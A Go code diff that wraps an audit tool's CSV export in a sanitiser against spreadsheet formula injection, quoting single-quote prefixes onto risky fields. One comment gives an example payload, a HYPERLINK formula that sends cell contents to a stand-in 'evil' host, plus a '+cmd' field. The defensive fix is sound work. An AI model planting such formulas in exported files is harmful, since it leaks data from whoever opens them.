@@ -41,12 +41,12 @@ func WriteAuditCSV(path string, result *audit.Result) error {
 		return err
 	}
 	if len(result.Findings) == 0 {
-		if err := w.Write(auditCSVSummaryRow(result)); err != nil {
+		if err := w.Write(sanitizeCSVRow(auditCSVSummaryRow(result))); err != nil {
 			return err
 		}
 	} else {
 		for _, finding := range result.Findings {
-			if err := w.Write(auditFindingCSVRow(finding)); err != nil {
+			if err := w.Write(sanitizeCSVRow(auditFindingCSVRow(finding))); err != nil {
 				return err
 			}
 		}
@@ -72,6 +72,34 @@ func auditCSVSummaryRow(result *audit.Result) []string {
 		"",
 		"",
 	}
+}
+
+// sanitizeCSVRow neutralizes spreadsheet formula injection in every field of a
+// data row before it is written.
+func sanitizeCSVRow(row []string) []string {
+	for i := range row {
+		row[i] = sanitizeCSVField(row[i])
+	}
+	return row
+}
+
+// sanitizeCSVField defuses CSV formula injection (CWE-1236). Finding data such
+// as package names, advisory IDs, and summaries is attacker-influenced — it
+// describes malicious packages and, for the live feed, is curated from
+// third-party intelligence. encoding/csv quotes delimiters but does not stop a
+// field like `=HYPERLINK("http://evil/?leak="&A1)`, `+cmd`, `-2+3`, `@SUM(...)`
+// or a leading tab/CR from being interpreted as a formula when the exported CSV
+// is opened in Excel, LibreOffice Calc, or Google Sheets. Per OWASP guidance,
+// prefix such values with a single quote so the cell is treated as text.
+func sanitizeCSVField(s string) string {
+	if s == "" {
+		return s
+	}
+	switch s[0] {
+	case '=', '+', '-', '@', '\t', '\r':
+		return "'" + s
+	}
+	return s
 }
 
 func auditCSVVerdict(summary audit.Summary) string {
